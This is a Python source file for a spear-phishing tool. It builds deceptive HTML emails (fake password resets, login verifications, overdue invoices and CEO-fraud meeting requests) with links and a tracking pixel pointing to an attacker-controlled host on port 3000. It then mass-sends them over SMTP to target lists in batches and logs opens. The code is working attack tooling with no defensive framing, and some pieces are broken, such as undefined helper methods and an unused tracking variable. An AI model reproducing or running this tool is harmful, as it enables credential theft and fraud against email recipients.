#!/usr/bin/env python3
"""
Spear Phishing Module
Email phishing functionality with HTML templates and tracking
"""

import os
import sys
import time
import random
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime

class SpearPhishModule:
    """Spear phishing module"""
    
    def __init__(self, smtp_server='localhost', smtp_port=25):
        """Initialize the spear phishing module"""
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.templates_dir = 'templates/phish_templates'
        self.tracking_dir = 'tracks'
        
        # Ensure directories exist
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.tracking_dir, exist_ok=True)
        
        # Default phishing templates
        self.default_templates = {
            'password_reset': {
                'name': 'Password Reset',
                'subject': 'Account Security Alert - Password Reset Required',
                'description': 'Tricks users into resetting their passwords'
            },
            'login_verification': {
                'name': 'Login Verification',
                'subject': 'Unusual Login Detected - Verify Your Identity',
                'description': 'Phishes login credentials with fake verification'
            },
            'invoice_overdue': {
                'name': 'Invoice Overdue',
                'subject': 'Invoice #12345 - Payment Due Immediately',
                'description': 'Targets finance departments with fake invoices'
            },
            'meeting_request': {
                'name': 'Meeting Request',
                'subject': 'URGENT: Meeting Request from CEO',
                'description': 'Uses CEO fraud to trick users into clicking links'
            }
        }
        
        # Create default templates if they don't exist
        self._create_default_templates()
        
    def _create_default_templates(self):
        """Create default phishing templates if they don't exist"""
        for template_name, template_info in self.default_templates.items():
            template_file = os.path.join(self.templates_dir, f"{template_name}.html")
            
            if not os.path.exists(template_file):
                self._create_template_file(template_name, template_info)
                
    def _create_template_file(self, template_name, template_info):
        """Create a template file"""
        html_content = self._generate_template_html(template_name, template_info)
        
        with open(os.path.join(self.templates_dir, f"{template_name}.html"), 'w') as f:
            f.write(html_content)
            
        print(f"Created template: {template_name}")
        
    def _generate_template_html(self, template_name, template_info):
        """Generate HTML for a phishing template"""
        base_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{subject}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }}
        .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ text-align: center; margin-bottom: 30px; }}
        .logo {{ font-size: 24px; font-weight: bold; color: #2c3e50; }}
        .content {{ color: #333; line-height: 1.6; }}
        .button {{ display: inline-block; background: #3498db; color: white; padding: 12px 20px; text-decoration: none; border-radius: 4px; margin: 20px 0; }}
        .footer {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">Your Company Name</div>
        </div>
        
        <div class="content">
            <h2>{subject}</h2>
            <p>Dear {{ email }},</p>
            {body}
            <p><a href="http://YOUR_IP:3000/verify/{{ email }}?t={{ int(time.time()) }}" class="button">Click Here</a></p>
            <p>If you did not request this, please ignore this email.</p>
        </div>
        
        <div class="footer">
            <p>This email was sent from Your Company Name</p>
            <p>123 Business Street, Suite 100<br>City, State 12345<br>Phone: (123) 456-7890</p>
        </div>
    </div>
    <img src="http://YOUR_IP:3000/track/{{ email }}?t={{ int(time.time()) }}" width="1" height="1">
</body>
</html>"""
        
        # Template-specific body content
        body_content = {
            'password_reset': """<p>We detected unusual activity on your account and have temporarily disabled your access as a security precaution.</p>
            <p>To reactivate your account, please click the button below to reset your password.</p>""",
            
            'login_verification': """<p>We detected an unusual login attempt from a new location (IP address: {{ request.remote_addr }}).</p>
            <p>To verify that this was you, please click the button below to confirm your login details.</p>""",
            
            'invoice_overdue': """<p>Your invoice #12345 is now overdue by 15 days. The total amount due is $1,234.56.</p>
            <p>To view and pay this invoice, please click the button below.</p>""",
            
            'meeting_request': """<p>I need to discuss an urgent matter with you regarding the upcoming project.</p>
            <p>Please click the button below to confirm your availability for a meeting tomorrow at 2 PM.</p>"""
        }
        
        return base_html.format(
            subject=template_info['subject'],
            body=body_content.get(template_name, "Please click the link below to continue.")
        )
        
    def list_templates(self):
        """List all available phishing templates"""
        templates = []
        
        for filename in os.listdir(self.templates_dir):
            if filename.endswith('.html'):
                template_name = filename.split('.')[0]
                templates.append({
                    'name': template_name,
                    'info': self.default_templates.get(template_name, {'name': template_name})
                })
                
        return templates
        
    def generate_phishing_email(self, email, template_name='password_reset', custom_data=None):
        """Generate a phishing email based on a template"""
        template_file = os.path.join(self.templates_dir, f"{template_name}.html")
        
        if not os.path.exists(template_file):
            print(f"Template not found: {template_file}")
            return None
            
        with open(template_file, 'r') as f:
            template_html = f.read()
            
        # Replace placeholders
        if custom_data is None:
            custom_data = {}
            
        email_html = template_html.replace('{{ email }}', email)
        email_html = email_html.replace('{{ int(time.time()) }}', str(int(time.time())))
        
        # Add tracking pixel
        tracking_pixel = f'<img src="http://{self.get_local_ip()}:3000/track/{email}?t={int(time.time())}" width="1" height="1">'
        email_html = email_html.replace('YOUR_IP', self.get_local_ip())
        
        return email_html
        
    def get_local_ip(self):
        """Get the local IP address"""
        import socket
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            return local_ip
        except:
            return '127.0.0.1'
            
    def send_email(self, from_email, to_email, subject, html_content, smtp_user=None, smtp_password=None):
        """Send an email using SMTP"""
        try:
            msg = MIMEMultipart('alternative')
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Subject'] = subject
            
            msg.attach(MIMEText(html_content, 'html'))
            
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                if smtp_user and smtp_password:
                    server.login(smtp_user, smtp_password)
                server.send_message(msg)
                
            return True
        except Exception as e:
            print(f"Error sending email to {to_email}: {e}")
            return False
            
    def track_email_open(self, email):
        """Track email open event"""
        timestamp = int(time.time())
        tracking_file = os.path.join(self.tracking_dir, f"{email}_track.json")
        
        try:
            if os.path.exists(tracking_file):
                with open(tracking_file, 'r') as f:
                    track_data = json.load(f)
            else:
                track_data = {'opens': []}
                
            track_data['opens'].append({
                'timestamp': timestamp,
                'ip': self.get_client_ip(),
                'user_agent': self.get_user_agent()
            })
            
            with open(tracking_file, 'w') as f:
                json.dump(track_data, f)
                
            print(f"Email opened by {email}")
            return track_data
        except Exception as e:
            print(f"Error tracking email open: {e}")
            return None
            
    def launch_campaign(self, target_list, template_name='password_reset', from_email='noreply@company.com', smtp_user=None, smtp_password=None):
        """Launch a phishing campaign against a list of targets"""
        print(f"Launching phishing campaign with {len(target_list)} targets")
        
        results = []
        
        for i, target in enumerate(target_list):
            if i > 0 and i % 10 == 0:
                print(f"Waiting 60 seconds before next batch...")
                time.sleep(60)
                
            print(f"Processing target {i+1}/{len(target_list)}: {target}")
            
            # Generate email content
            html_content = self.generate_phishing_email(target, template_name)
            
            if html_content:
                # Get subject from template
                subject = self.default_templates.get(template_name, {}).get('subject', 'Important Security Notice')
                
                # Send email
                success = self.send_email(from_email, target, subject, html_content, smtp_user, smtp_password)
                
                results.append({
                    'email': target,
                    'template': template_name,
                    'sent': success,
                    'timestamp': int(time.time())
                })
                
                print(f"Email {'sent' if success else 'failed'} to {target}")
                
        return results
        
    def list_campaigns(self):
        """List all previous phishing campaigns"""
        campaigns = []
        campaign_dir = 'payloads'
        
        if os.path.exists(campaign_dir):
            for filename in os.listdir(campaign_dir):
                if filename.startswith('phish_') and filename.endswith('.json'):
                    try:
                        with open(os.path.join(campaign_dir, filename), 'r') as f:
                            campaign_data = json.load(f)
                            campaigns.append(campaign_data)
                    except Exception as e:
                        print(f"Error reading campaign file {filename}: {e}")
                        
        return campaigns
        
    def save_campaign(self, campaign_data):
        """Save campaign data"""
        campaign_file = f"payloads/phish_{int(time.time())}.json"
        
        try:
            with open(campaign_file, 'w') as f:
                json.dump(campaign_data, f)
            print(f"Campaign saved to: {campaign_file}")
            return campaign_file
        except Exception as e:
            print(f"Error saving campaign: {e}")
            return None
            
    def get_statistics(self):
        """Get phishing campaign statistics"""
        statistics = {
            'total_sent': 0,
            'total_opened': 0,
            'templates_used': set()
        }
        
        campaign_file = 'payloads/phish_stats.json'
        
        if os.path.exists(campaign_file):
            with open(campaign_file, 'r') as f:
                statistics = json.load(f)
                
        return statistics
        
    def update_statistics(self, result):
        """Update campaign statistics"""
        stats = self.get_statistics()
        stats['total_sent'] += 1
        if result.get('opened', False):
            stats['total_opened'] += 1
        stats['templates_used'].add(result.get('template', 'unknown'))
        
        with open('payloads/phish_stats.json', 'w') as f:
            json.dump(stats, f)
            
    def test_email_rendering(self, template_name='password_reset'):
        """Test rendering an email template"""
        test_html = self.generate_phishing_email('test@example.com', template_name)
        
        if test_html:
            temp_file = f"templates/phish_templates/test_{template_name}.html"
            
            with open(temp_file, 'w') as f:
                f.write(test_html)
                
            print(f"Test email saved to: {temp_file}")
            print(f"To view, open {temp_file} in a web browser")
            
            return temp_file
        return None

if __name__ == "__main__":
    # Example usage
    if len(sys.argv) < 2:
        print("Usage: python spear_phish.py <command> [arguments]")
        print("Commands:")
        print("  list - List available templates")
        print("  test <template> - Test template rendering")
        print("  send <email> <template> - Send a test email")
        print("  campaign <target_list.txt> <template> - Launch a campaign")
        sys.exit(1)
        
    command = sys.argv[1]
    spm = SpearPhishModule()
    
    if command == 'list':
        templates = spm.list_templates()
        print("Available templates:")
        for template in templates:
            print(f"  {template['name']} - {template['info']['description']}")
            
    elif command == 'test':
        if len(sys.argv) < 3:
            print("Usage: python spear_phish.py test <template>")
            sys.exit(1)
            
        template_name = sys.argv[2]
        temp_file = spm.test_email_rendering(template_name)
        
    elif command == 'send':
        if len(sys.argv) < 4:
            print("Usage: python spear_phish.py send <email> <template>")
            sys.exit(1)
            
        email = sys.argv[2]
        template_name = sys.argv[3]
        
        spm.launch_campaign([email], template_name)
        
    elif command == 'campaign':
        if len(sys.argv) < 4:
            print("Usage: python spear_phish.py campaign <target_list.txt> <template>")
            sys.exit(1)
            
        target_file = sys.argv[2]
        template_name = sys.argv[3]
        
        if not os.path.exists(target_file):
            print(f"Target list file not found: {target_file}")
            sys.exit(1)
            
        targets = []
        with open(target_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and line not in targets:
                    targets.append(line)
                    
        spm.launch_campaign(targets, template_name)
